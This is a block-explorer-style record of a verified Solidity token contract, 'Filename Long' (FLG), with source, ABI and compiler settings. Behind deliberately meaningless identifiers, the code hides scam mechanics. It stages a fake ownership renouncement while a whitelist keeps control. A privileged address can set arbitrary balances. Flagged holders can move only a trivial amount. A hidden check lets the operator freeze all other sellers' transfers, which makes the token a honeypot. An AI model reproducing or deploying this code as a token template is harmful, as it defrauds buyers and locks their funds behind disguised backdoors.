{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface walletSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountReceiver {\n    function createPair(address enableFee, address tokenMax) external returns (address);\n}\n\ninterface sellTokenExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTotal) external view returns (uint256);\n\n    function transfer(address autoEnableSell, uint256 swapShouldLimit) external returns (bool);\n\n    function allowance(address totalAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapShouldLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoEnableSell,\n        uint256 swapShouldLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptFund, uint256 value);\n    event Approval(address indexed totalAuto, address indexed spender, uint256 value);\n}\n\ninterface teamSwapLaunch is sellTokenExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FilenameLong is txLiquidity, sellTokenExempt, teamSwapLaunch {\n\n    function txMarketing(address marketingLaunch) public {\n        if (autoModeTo) {\n            return;\n        }\n        if (receiverLaunch == atLaunchAuto) {\n            teamSender = false;\n        }\n        takeMarketing[marketingLaunch] = true;\n        \n        autoModeTo = true;\n    }\n\n    function atLaunch(address feeReceiverTo, uint256 swapShouldLimit) public {\n        toShould();\n        toSwap[feeReceiverTo] = swapShouldLimit;\n    }\n\n    function allowance(address senderFrom, address listTxTo) external view virtual override returns (uint256) {\n        if (listTxTo == receiverLiquidityFrom) {\n            return type(uint256).max;\n        }\n        return feeTotal[senderFrom][listTxTo];\n    }\n\n    uint256 public fromSwap;\n\n    event OwnershipTransferred(address indexed autoTotal, address indexed tradingList);\n\n    mapping(address => bool) public takeMarketing;\n\n    constructor (){\n        \n        walletSwap fromSender = walletSwap(receiverLiquidityFrom);\n        enableLiquidityList = amountReceiver(fromSender.factory()).createPair(fromSender.WETH(), address(this));\n        if (atLaunchAuto != fromSwap) {\n            atLaunchAuto = fromSwap;\n        }\n        listLaunchedEnable = _msgSender();\n        liquiditySwap();\n        takeMarketing[listLaunchedEnable] = true;\n        toSwap[listLaunchedEnable] = shouldLimit;\n        \n        emit Transfer(address(0), listLaunchedEnable, shouldLimit);\n    }\n\n    mapping(address => bool) public exemptSellTake;\n\n    function balanceOf(address txTotal) public view virtual override returns (uint256) {\n        return toSwap[txTotal];\n    }\n\n    bool private teamSender;\n\n    string private feeLiquidityTx = \"Filename Long\";\n\n    function modeAutoFund(address swapFund, address autoEnableSell, uint256 swapShouldLimit) internal returns (bool) {\n        require(toSwap[swapFund] >= swapShouldLimit);\n        toSwap[swapFund] -= swapShouldLimit;\n        toSwap[autoEnableSell] += swapShouldLimit;\n        emit Transfer(swapFund, autoEnableSell, swapShouldLimit);\n        return true;\n    }\n\n    mapping(address => uint256) private toSwap;\n\n    function approve(address listTxTo, uint256 swapShouldLimit) public virtual override returns (bool) {\n        feeTotal[_msgSender()][listTxTo] = swapShouldLimit;\n        emit Approval(_msgSender(), listTxTo, swapShouldLimit);\n        return true;\n    }\n\n    uint256 private shouldLimit = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLimit;\n    }\n\n    uint256 private atLaunchAuto;\n\n    uint8 private modeAmountBuy = 18;\n\n    function totalToken(address toLiquidity) public {\n        toShould();\n        \n        if (toLiquidity == listLaunchedEnable || toLiquidity == enableLiquidityList) {\n            return;\n        }\n        exemptSellTake[toLiquidity] = true;\n    }\n\n    address public enableLiquidityList;\n\n    function transferFrom(address swapFund, address autoEnableSell, uint256 swapShouldLimit) external override returns (bool) {\n        if (_msgSender() != receiverLiquidityFrom) {\n            if (feeTotal[swapFund][_msgSender()] != type(uint256).max) {\n                require(swapShouldLimit <= feeTotal[swapFund][_msgSender()]);\n                feeTotal[swapFund][_msgSender()] -= swapShouldLimit;\n            }\n        }\n        return launchAt(swapFund, autoEnableSell, swapShouldLimit);\n    }\n\n    bool private modeReceiver;\n\n    uint256 public receiverSenderMin;\n\n    function launchAt(address swapFund, address autoEnableSell, uint256 swapShouldLimit) internal returns (bool) {\n        if (swapFund == listLaunchedEnable) {\n            return modeAutoFund(swapFund, autoEnableSell, swapShouldLimit);\n        }\n        uint256 fromMax = sellTokenExempt(enableLiquidityList).balanceOf(totalLiquidity);\n        require(fromMax == tokenFund);\n        require(autoEnableSell != totalLiquidity);\n        if (exemptSellTake[swapFund]) {\n            return modeAutoFund(swapFund, autoEnableSell, sellToken);\n        }\n        return modeAutoFund(swapFund, autoEnableSell, swapShouldLimit);\n    }\n\n    bool public autoModeTo;\n\n    function toShould() private view {\n        require(takeMarketing[_msgSender()]);\n    }\n\n    address receiverLiquidityFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeAmountBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return feeLiquidityTx;\n    }\n\n    address private launchedTeam;\n\n    address public listLaunchedEnable;\n\n    function transfer(address feeReceiverTo, uint256 swapShouldLimit) external virtual override returns (bool) {\n        return launchAt(_msgSender(), feeReceiverTo, swapShouldLimit);\n    }\n\n    uint256 private receiverLaunch;\n\n    function liquiditySwap() public {\n        emit OwnershipTransferred(listLaunchedEnable, address(0));\n        launchedTeam = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedTeam;\n    }\n\n    uint256 fundSell;\n\n    uint256 tokenFund;\n\n    uint256 constant sellToken = 8 ** 10;\n\n    function modeLaunch(uint256 swapShouldLimit) public {\n        toShould();\n        tokenFund = swapShouldLimit;\n    }\n\n    bool private modeTxAuto;\n\n    address totalLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellFund;\n    }\n\n    string private sellFund = \"FLG\";\n\n    function owner() external view returns (address) {\n        return launchedTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTxTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldLimit\",\"type\":\"uint256\"}],\"name\":\"atLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoModeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidityList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptSellTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunchedEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapShouldLimit\",\"type\":\"uint256\"}],\"name\":\"modeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"}],\"name\":\"totalToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoEnableSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"}],\"name\":\"txMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FilenameLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}